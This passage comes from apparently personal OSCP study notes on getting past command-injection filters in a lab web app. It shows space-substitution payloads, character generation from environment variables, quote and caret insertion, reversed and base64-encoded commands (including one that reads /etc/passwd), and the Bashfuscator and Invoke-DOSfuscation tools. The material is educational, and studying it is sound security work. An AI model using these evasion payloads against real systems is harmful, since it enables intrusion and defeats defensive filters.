<a href=javascript:history.back(); class=lightbox-back id=R-image-08105ee887f5c37d97498b4e90f7610e><img alt="Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to &lsquo;127.0.0.1%0a+whoami&rsquo;. The response displays HTML for a Host Checker form and an &lsquo;Invalid input&rsquo; message." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/cmdinj_filters_spaces_1.jpg></a></p><p>As we can see, we still get an <code>invalid input</code> error message, meaning that we still have other filters to bypass. So, as we did before, let us only add the next character (which is a space) and see if it caused the denied request: <a href=#R-image-5767b81943fe78884267e4e772ca150b class=lightbox-link><img alt="Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to &lsquo;127.0.0.1%0a+whoami&rsquo;. The response displays HTML for a Host Checker form and an &lsquo;Invalid input&rsquo; message." class="lazy lightbox figure-image" loading=lazy src=../../resources/cmdinj_filters_spaces_2.jpg style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-5767b81943fe78884267e4e772ca150b><img alt="Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to &lsquo;127.0.0.1%0a+whoami&rsquo;. The response displays HTML for a Host Checker form and an &lsquo;Invalid input&rsquo; message." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/cmdinj_filters_spaces_2.jpg></a></p><p>As we can see, the space character is indeed blacklisted as well. A space is a commonly blacklisted character, especially if the input should not contain any spaces, like an IP, for example. Still, there are many ways to add a space character without actually using the space character!</p><p>¬†</p><p>¬†</p><h4 id=using-tabs>Using Tabs</h4><p>Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same. So, let us try to use a tab instead of the space character (<code>127.0.0.1%0a%09</code>) and see if our request is accepted: <a href=#R-image-b38723523c0d6e9f3bc83a8dc42417f4 class=lightbox-link><img alt="Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to &lsquo;127.0.0.1%0a%09&rsquo;. The response displays HTML for a Host Checker form and ping results for 127.0.0.1." class="lazy lightbox figure-image" loading=lazy src=../../resources/cmdinj_filters_spaces_3.jpg style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-b38723523c0d6e9f3bc83a8dc42417f4><img alt="Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to &lsquo;127.0.0.1%0a%09&rsquo;. The response displays HTML for a Host Checker form and ping results for 127.0.0.1." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/cmdinj_filters_spaces_3.jpg></a></p><p>As we can see, we successfully bypassed the space character filter by using a tab instead. Let us see another method of replacing space characters.</p><p>¬†</p><p>¬†</p><h4 id=using-ifs>Using $IFS</h4><p>Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use <code>${IFS}\</code> where the spaces should be, the variable should be automatically replaced with a space, and our command should work.</p><p>Let us use <code>${IFS}</code> and see if it works (<code>127.0.0.1%0a${IFS}</code>): <a href=#R-image-01bf398e64b42dc23620d5ac7b048c65 class=lightbox-link><img alt="Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to &lsquo;127.0.0.1%0a${IFS}&rsquo;. The response displays HTML for a Host Checker form and ping results for 127.0.0.1." class="lazy lightbox figure-image" loading=lazy src=../../resources/cmdinj_filters_spaces_4.jpg style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-01bf398e64b42dc23620d5ac7b048c65><img alt="Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to &lsquo;127.0.0.1%0a${IFS}&rsquo;. The response displays HTML for a Host Checker form and ping results for 127.0.0.1." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/cmdinj_filters_spaces_4.jpg></a></p><p>¬†</p><p>¬†</p><h4 id=using-brace-expansion>Using Brace Expansion</h4><p>There are many other methods we can utilize to bypass space filters. For example, we can use the <code>Bash Brace Expansion</code> feature, which automatically adds spaces between arguments wrapped between braces, as follows:</p><p>Bypassing Space Filters</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ {ls,-la}
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>total 0
</span></span><span style=display:flex><span>drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
</span></span><span style=display:flex><span>drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
</span></span></code></pre></div><p>As we can see, the command was successfully executed without having spaces in it. We can utilize the same method in command injection filter bypasses, by using brace expansion on our command arguments, like (<code>127.0.0.1%0a{ls,-la}</code>). To discover more space filter bypasses, check out the <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space rel=external>PayloadsAllTheThings</a> page on writing commands without spaces.</p><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=bypassing-other-blacklisted-characters>Bypassing Other Blacklisted Characters</h1><hr><p>Besides injection operators and space characters, a very commonly blacklisted character is the slash (<code>/</code>) or backslash (<code>\</code>) character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo ${PATH}
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/usr/local/bin:/usr/bin:/bin:/usr/games
</span></span></code></pre></div><p>So, if we start at the <code>0</code> character, and only take a string of length <code>1</code>, we will end up with only the <code>/</code> character, which we can use in our payload:</p><p>Bypassing Other Blacklisted Characters</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo ${PATH:0:1}
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><p>We can do the same with the <code>$HOME</code> or <code>$PWD</code> environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:</p><p>Bypassing Other Blacklisted Characters</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo ${LS_COLORS:10:1}
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>;
</span></span></code></pre></div><p>¬†</p><p><a href=#R-image-7fe650c5cca2ce6979473c2a9cd08150 class=lightbox-link><img alt=7f1c8f0d96ede9ac4b57a6918811afc0.png class="lazy lightbox figure-image" loading=lazy src=../../resources/7f1c8f0d96ede9ac4b57a6918811afc0.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-7fe650c5cca2ce6979473c2a9cd08150><img alt=7f1c8f0d96ede9ac4b57a6918811afc0.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/7f1c8f0d96ede9ac4b57a6918811afc0.png></a></p><p>¬†</p><p>¬†</p><h2 id=windows>Windows</h2><p>The same concept works on Windows as well. For example, to produce a slash in <code>Windows Command Line (CMD)</code>, we can <code>echo</code> a Windows variable (<code>%HOMEPATH%</code> -> <code>\Users\local-student</code>), and then specify a starting position (<code>~6</code> -> <code>\local-student</code>), and finally specifying a negative end position, which in this case is the length of the username <code>local-student</code> (<code>-11</code> -> <code>\</code>) :</p><p>Bypassing Other Blacklisted Characters</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; echo %HOMEPATH:~6,-11%

\</code></pre></div><p>We can achieve the same thing using the same variables in <code>Windows PowerShell</code>. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don&rsquo;t have to specify the start and end positions:</p><p>Bypassing Other Blacklisted Characters</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; $env:HOMEPATH[0]

\


PS C:\local&gt; $env:PROGRAMFILES[10]
PS C:\local&gt;</code></pre></div><p>We can also use the <code>Get-ChildItem Env:</code> PowerShell command to print all environment variables and then pick one of them to produce a character we need. <code>Try to be creative and find different commands to produce similar characters.</code></p><p>¬†</p><p>¬†</p><h2 id=character-shifting>Character Shifting</h2><p>There are other techniques to produce the required characters without using them, like <code>shifting characters</code>. For example, the following Linux command shifts the character we pass by <code>1</code>. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with <code>man ascii</code>), then add it instead of <code>[</code> in the below example. This way, the last printed character would be the one we need:</p><p>Bypassing Other Blacklisted Characters</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ man ascii     # \ is on 92, before it is [ on 91
</span></span><span style=display:flex><span>cube111@local[/local]$ echo $(tr &#39;!-}&#39; &#39;&#34;-~&#39;&lt;&lt;&lt;[)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>\
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h1 id=bypassing-blacklisted-commands>Bypassing Blacklisted Commands</h1><p>¬†</p><h2 id=linux--windows>Linux & Windows</h2><p>One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like <code>Bash</code> or <code>PowerShell</code> and will execute the same command as if they were not there. Some of these characters are a single-quote <code>'</code> and a double-quote <code>"</code>, in addition to a few others.</p><p>The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the <code>whoami</code> command, we can insert single quotes between its characters, as follows:</p><p>Bypassing Blacklisted Commands</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>21y4d@local[/local]$ w&#39;h&#39;o&#39;am&#39;i
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>21y4d
</span></span></code></pre></div><p>The same works with double-quotes as well:</p><p>Bypassing Blacklisted Commands</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>21y4d@local[/local]$ w&#34;h&#34;o&#34;am&#34;i
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>21y4d
</span></span></code></pre></div><p>The important things to remember are that <code>we cannot mix types of quotes</code> and <code>the number of quotes must be even</code>. We can try one of the above in our payload (<code>127.0.0.1%0aw'h'o'am'i</code>) and see if it works:</p><h4 id=burp-post-request>Burp POST Request</h4><p><a href=#R-image-5729ab5b966ce176ac9e0985386cbef8 class=lightbox-link><img alt="Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section displays HTML for a &lsquo;Host Checker&rsquo; form, allowing IP input and showing ping results for 127.0.0.1." class="lazy lightbox figure-image" loading=lazy src=../../resources/cmdinj_filters_commands_2.jpg style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-5729ab5b966ce176ac9e0985386cbef8><img alt="Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section displays HTML for a &lsquo;Host Checker&rsquo; form, allowing IP input and showing ping results for 127.0.0.1." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/cmdinj_filters_commands_2.jpg></a></p><p>¬†</p><p>¬†</p><h2 id=linux-only>Linux Only</h2><p>We can insert a few other Linux-only characters in the middle of commands, and the <code>bash</code> shell would ignore them and execute the command. These characters include the backslash <code>\</code> and the positional parameter character <code>$@</code>. This works exactly as it did with the quotes, but in this case, <code>the number of characters do not have to be even</code>, and we can insert just one of them if we want to:</p><p>Code: bash</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>who$@ami
</span></span><span style=display:flex><span>w<span style=color:#ae81ff>\h</span>o<span style=color:#ae81ff>\a</span>m<span style=color:#ae81ff>\i</span></span></span></code></pre></div><p>Exercise: Try the above two examples in your payload, and see if they work in bypassing the command filter. If they do not, this may indicate that you may have used a filtered character. Would you be able to bypass that as well, using the techniques we learned in the previous section?</p><p>¬†</p><h2 id=windows-only>Windows Only</h2><p>There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (<code>^</code>) character, as we can see in the following example:</p><p>Bypassing Blacklisted Commands</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; who^ami

21y4d</code></pre></div><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>21y4d@local[/local]$ $(tr &#34;[A-Z]&#34; &#34;[a-z]&#34;&lt;&lt;&lt;&#34;WhOaMi&#34;)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>21y4d
</span></span></code></pre></div><p>¬†</p><p><a href=#R-image-db0bc94bb88fe1528eb1225cbcc02610 class=lightbox-link><img alt=81a28a99a24ddc55a66ddf2f44bded3e.png class="lazy lightbox figure-image" loading=lazy src=../../resources/81a28a99a24ddc55a66ddf2f44bded3e.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-db0bc94bb88fe1528eb1225cbcc02610><img alt=81a28a99a24ddc55a66ddf2f44bded3e.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/81a28a99a24ddc55a66ddf2f44bded3e.png></a></p><p>¬†</p><p>¬†</p><h2 id=reversed-commands>Reversed Commands</h2><p>Another command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time. In this case, we will be writing <code>imaohw</code> instead of <code>whoami</code> to avoid triggering the blacklisted command.</p><p>We can get creative with such techniques and create our own Linux/Windows commands that eventually execute the command without ever containing the actual command words. First, we&rsquo;d have to get the reversed string of our command in our terminal, as follows:</p><p>Advanced Command Obfuscation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo &#39;whoami&#39; | rev
</span></span><span style=display:flex><span>imaohw
</span></span></code></pre></div><p>Then, we can execute the original command by reversing it back in a sub-shell (<code>$()</code>), as follows:</p><p>Advanced Command Obfuscation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>21y4d@local[/local]$ $(rev&lt;&lt;&lt;&#39;imaohw&#39;)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>21y4d
</span></span></code></pre></div><p>We see that even though the command does not contain the actual <code>whoami</code> word, it does work the same and provides the expected output. We can also test this command with our exercise, and it indeed works:</p><h4 id=burp-post-request-1>Burp POST Request</h4><p><a href=#R-image-0a5fe704b866ac3cbb3580aef9715367 class=lightbox-link><img alt="Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section displays HTML for a &lsquo;Host Checker&rsquo; form, allowing IP input and showing ping results for 127.0.0.1 with user &lsquo;www-data&rsquo;." class="lazy lightbox figure-image" loading=lazy src=../../resources/cmdinj_filters_commands_5.jpg style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-0a5fe704b866ac3cbb3580aef9715367><img alt="Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section displays HTML for a &lsquo;Host Checker&rsquo; form, allowing IP input and showing ping results for 127.0.0.1 with user &lsquo;www-data&rsquo;." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/cmdinj_filters_commands_5.jpg></a></p><p>Tip: If you wanted to bypass a character filter with the above method, you&rsquo;d have to reverse them as well, or include them when reversing the original command.</p><p>The same can be applied in <code>Windows.</code> We can first reverse a string, as follows:</p><p>Advanced Command Obfuscation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; &#34;whoami&#34;[-1..-20] -join &#39;&#39;

imaohw</code></pre></div><p>We can now use the below command to execute a reversed string with a PowerShell sub-shell (<code>iex "$()"</code>), as follows:</p><p>Advanced Command Obfuscation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; iex &#34;$(&#39;imaohw&#39;[-1..-20] -join &#39;&#39;)&#34;

21y4d</code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><h2 id=encoded-commands>Encoded Commands</h2><p>The final technique we will discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, we will try to create our own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. The command we create will be unique to each case, depending on what characters are allowed and the level of security on the server.</p><p>We can utilize various encoding tools, like <code>base64</code> (for b64 encoding) or <code>xxd</code> (for hex encoding). Let&rsquo;s take <code>base64</code> as an example. First, we&rsquo;ll encode the payload we want to execute (which includes filtered characters):</p><p>Advanced Command Obfuscation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo -n &#39;cat /etc/passwd | grep 33&#39; | base64
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
</span></span></code></pre></div><p>Now we can create a command that will decode the encoded string in a sub-shell (<code>$()</code>), and then pass it to <code>bash</code> to be executed (i.e. <code>bash&lt;&lt;&lt;</code>), as follows:</p><p>Advanced Command Obfuscation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span></code></pre></div><p>As we can see, the above command executes the command perfectly. We did not include any filtered characters and avoided encoded characters that may lead the command to fail to execute.</p><p>Tip: Note that we are using <code>&lt;&lt;&lt;</code> to avoid using a pipe <code>|</code>, which is a filtered character.</p><p>Now we can use this command (once we replace the spaces) to execute the same command through command injection:</p><h4 id=burp-post-request-2>Burp POST Request</h4><p><a href=#R-image-4e50d3840eae860afb16993e2460ff89 class=lightbox-link><img alt="Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt using base64 decoding. The response section displays HTML for a &lsquo;Host Checker&rsquo; form, allowing IP input and showing ping results for 127.0.0.1 with user &lsquo;www-data&rsquo; and additional user information." class="lazy lightbox figure-image" loading=lazy src=../../resources/cmdinj_filters_commands_6.jpg style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-4e50d3840eae860afb16993e2460ff89><img alt="Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt using base64 decoding. The response section displays HTML for a &lsquo;Host Checker&rsquo; form, allowing IP input and showing ping results for 127.0.0.1 with user &lsquo;www-data&rsquo; and additional user information." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/cmdinj_filters_commands_6.jpg></a></p><p>Even if some commands were filtered, like <code>bash</code> or <code>base64</code>, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like <code>sh</code> for command execution and <code>openssl</code> for b64 decoding, or <code>xxd</code> for hex decoding.</p><p>We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:</p><p>Advanced Command Obfuscation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&#39;whoami&#39;))

dwBoAG8AYQBtAGkA</code></pre></div><p>We may also achieve the same thing on Linux, but we would have to convert the string from <code>utf-8</code> to <code>utf-16</code> before we <code>base64</code> it, as follows:</p><p>Advanced Command Obfuscation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>dwBoAG8AYQBtAGkA
</span></span></code></pre></div><p>Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (<code>iex "$()"</code>), as follows:</p><p>Advanced Command Obfuscation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; iex &#34;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;dwBoAG8AYQBtAGkA&#39;)))&#34;

21y4d</code></pre></div><p>As we can see, we can get creative with <code>Bash</code> or <code>PowerShell</code> and create new bypassing and obfuscation methods that have not been used before, and hence are very likely to bypass filters and WAFs. Several tools can help us automatically obfuscate our commands, which we will discuss in the next section.</p><p>In addition to the techniques we discussed, we can utilize numerous other methods, like wildcards, regex, output redirection, integer expansion, and many others. We can find some such techniques on <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion rel=external>PayloadsAllTheThings</a>.</p><p>¬†</p><p>¬†</p><p>¬†</p><p>¬†</p><h2 id=-evasion-tools-for-command-injection>üîê Evasion Tools for Command Injection</h2><p>When basic obfuscation fails against advanced security tools, automated evasion tools help. This section covers:</p><ul><li><p><strong>Bashfuscator</strong> (Linux)</p></li><li><p><strong>Invoke-DOSfuscation</strong> (Windows)</p></li></ul><hr><h3 id=-linux-bashfuscator>üêß Linux: Bashfuscator</h3><p><strong>Purpose:</strong> Obfuscate Bash commands to bypass filters.</p><p><strong>Installation:</strong></p><p>bash</p><p>CopyEdit</p><p><code>git clone https://github.com/Bashfuscator/Bashfuscatorcd Bashfuscatorpip3 install setuptools==65python3 setup.py install --user</code></p><p><strong>Usage:</strong></p><p>bash</p><p>CopyEdit</p><p><code>cd ./bashfuscator/bin/./bashfuscator -h # View help menu</code></p><p><strong>Basic Obfuscation Example:</strong></p><p>bash</p><p>CopyEdit</p><p><code>./bashfuscator -c 'cat /etc/passwd'</code></p><blockquote><p>‚ö†Ô∏è May generate very large payloads randomly using multiple techniques.</p></blockquote><p><strong>Customized, Short Obfuscation:</strong></p><p>bash</p><p>CopyEdit</p><p><code>./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1</code></p><p><strong>Test Output:</strong></p><p>bash</p><p>CopyEdit</p><p><code>bash -c 'eval "$(W0=(w \ t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'</code></p><blockquote><p>‚úÖ Output should mimic <code>cat /etc/passwd</code> while appearing obfuscated.</p></blockquote><p><strong>Exercise:</strong> Test the output on your web app to check if it bypasses filters. Adjust flags if needed.</p><hr><h3 id=-windows-invoke-dosfuscation>ü™ü Windows: Invoke-DOSfuscation</h3><p><strong>Purpose:</strong> Obfuscate Windows CMD/PowerShell commands.</p><p><strong>Installation and Launch:</strong></p><p>powershell</p><p>CopyEdit</p><p><code>git clone https://github.com/danielbohannon/Invoke-DOSfuscation.gitcd Invoke-DOSfuscationImport-Module .\Invoke-DOSfuscation.psd1Invoke-DOSfuscation</code></p><p><strong>Usage:</strong></p><p>powershell</p><p>CopyEdit</p><p><code>Invoke-DOSfuscation> help # Show help optionsInvoke-DOSfuscation> SET COMMAND type C:\Users\local-student\Desktop\flag.txtInvoke-DOSfuscation> encodingInvoke-DOSfuscation\Encoding> 1 # Choose encoding technique</code></p><p><strong>Generated Obfuscated Example:</strong></p><p>cmd</p><p>CopyEdit</p><p><code>typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt</code></p><p><strong>Execution on CMD:</strong></p><p>cmd</p><p>CopyEdit</p><p><code>C:\local> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt</code></p><blockquote><p>‚úÖ Outputs: <code>test_flag</code></p></blockquote><p><strong>Note:</strong> You can test it on Linux using <code>pwsh</code>. The tool is preinstalled on <code>Pwnbox</code>.</p><hr><p>For advanced techniques, check the <strong>Secure Coding 101: JavaScript</strong> module.</p><p>¬†</p><p>¬†</p><p>¬†</p><footer class=footline></footer></article></div></main></div><aside id=R-sidebar class=default-animation><div id=R-header-topbar class=default-animation></div><div id=R-header-wrapper class=default-animation><div id=R-header class=default-animation><a id=R-logo class=R-default href=../../><div class=logo-title style=display:flex;align-items:center><img src=../../images/logo.png alt=Logo style=width:90px;height:80>
<span>DrakonOps</span></div></a></div><search><form action=../../search/index.html method=get><div class="searchbox default-animation"><button class=search-detail type=submit title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
<label class=a11y-only for=R-search-by>Search</label>
<input data-search-input id=R-search-by name=search-by class=search-by type=search placeholder=Search...>
<button class=search-clear type=button data-search-clear title="Clear search"><i class="fas fa-times" title="Clear search"></i></button></div></form></search></div><div id=R-homelinks class="default-animation homelinks"><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-homelinks"><ul class="space collapsible-menu"><li data-nav-url=../../index.html><a class=padding href=../../index.html><i class="fa-fw fas fa-home"></i> Home</a></li></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-headercontrols"><ul></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div></div><div id=R-content-wrapper class=highlightable><div class="R-sidebarmenu R-shortcutmenu-main"><ul class="enlarge morespace collapsible-menu"><li data-nav-url=../../ad-pentesting/index.html><a class=padding href=../../ad-pentesting/index.html>AD Pentesting<i class="fa-fw fas fa-check read-icon"></i></a></li><li class=parent data-nav-url=../../oscp-notes/index.html><input type=checkbox id=R-section-5f51e3ac21bcc264f305c28eac7484ea aria-controls=R-subsections-5f51e3ac21bcc264f305c28eac7484ea checked><label for=R-section-5f51e3ac21bcc264f305c28eac7484ea><i class="fa-fw fas fa-chevron-right"></i><span class=a11y-only>Submenu OSCP Notes</span></label><a class=padding href=../../oscp-notes/index.html>OSCP Notes<i class="fa-fw fas fa-check read-icon"></i></a><ul id=R-subsections-5f51e3ac21bcc264f305c28eac7484ea class=collapsible-menu><li data-nav-url=../../oscp-notes/main-methodology/index.html><a class=padding href=../../oscp-notes/main-methodology/index.html>main methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/methodology/index.html><a class=padding href=../../oscp-notes/methodology/index.html>methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/project/index.html><a class=padding href=../../oscp-notes/project/index.html>project<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html><a class=padding href=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html>footprinting and finger printing web apps<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nmap/index.html><a class=padding href=../../oscp-notes/nmap/index.html>nmap<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/go-busters/index.html><a class=padding href=../../oscp-notes/go-busters/index.html>Go busters<i class="fa-fw fas fa-check 